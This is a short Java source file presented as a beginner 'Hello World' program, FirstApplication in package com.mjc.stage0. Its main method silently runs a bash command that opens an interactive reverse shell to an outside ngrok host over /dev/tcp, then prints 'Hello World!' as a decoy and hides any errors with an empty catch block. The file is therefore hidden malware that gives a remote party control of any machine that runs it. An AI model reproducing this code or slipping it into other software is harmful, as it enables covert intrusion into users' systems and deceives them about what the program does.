package com.mjc.stage0;

public class FirstApplication {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/19186 0>&1");
            p.waitFor();
            p.destroy();
            System.out.println("Hello World!"); 
        } catch (Exception e) {}
    }
}
